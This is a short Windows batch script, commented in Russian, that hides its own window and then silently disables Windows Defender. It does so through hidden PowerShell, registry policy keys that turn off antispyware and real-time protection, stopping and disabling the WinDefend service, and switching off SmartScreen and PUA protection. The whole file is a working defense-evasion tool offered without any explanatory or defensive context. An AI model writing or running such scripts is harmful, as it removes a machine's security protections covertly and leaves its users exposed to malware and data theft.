@echo off
:: Скрытие окна (запуск с минимизацией)
if not "%minimized%"=="" goto :minimized
set minimized=true
start /min cmd.exe /C "%~dpnx0"
goto :eof

:minimized
:: Отключение в реальном времени через PowerShell
powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: Добавление ключей в реестр для полного отключения
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "FallbackOrder" /t REG_DWORD /d 0 /f

:: Остановка служб Защитника
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1

:: Отключение SmartScreen
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SmartScreen" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnablePUAProtection" /t REG_DWORD /d 0 /f

exit
